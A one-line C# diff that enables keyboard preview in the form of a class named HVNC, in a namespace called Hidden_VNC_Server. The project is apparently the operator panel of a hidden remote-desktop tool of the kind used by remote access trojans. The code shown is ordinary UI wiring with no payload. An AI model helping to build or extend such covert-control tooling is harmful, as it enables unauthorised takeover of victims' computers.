@@ -18,6 +18,7 @@ namespace Hidden_VNC_Server
         public HVNC()
         {
             InitializeComponent();
+            this.KeyPreview = true;
             img.MouseDown += PictureBox1_MouseDown;
             img.MouseUp += PictureBox1_MouseUp;
             this.KeyDown += HVNC_KeyDown;
